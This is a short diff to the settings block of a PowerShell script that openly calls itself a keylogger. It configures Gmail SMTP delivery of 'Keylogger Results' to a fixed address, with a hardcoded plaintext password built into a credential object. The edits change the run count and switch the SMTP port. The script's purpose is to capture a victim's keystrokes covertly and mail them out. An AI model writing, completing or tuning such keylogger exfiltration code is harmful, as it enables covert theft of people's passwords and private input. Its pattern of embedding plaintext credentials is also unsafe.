@@ -1,5 +1,5 @@
 # Edit only this section!
-$TimesToRun = 1
+$TimesToRun = 2
 $RunTimeP = 60
 $From = "qwertyor1234@gmail.com"
 $Pass = "mastscholar"
@@ -7,7 +7,7 @@ $To = "qwertyor1234@gmail.com"
 $Subject = "Keylogger Results"
 $body = "Keylogger Results"
 $SMTPServer = "smtp.gmail.com"
-$SMTPPort = "465"
+$SMTPPort = "587"
 $credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 ############################
 
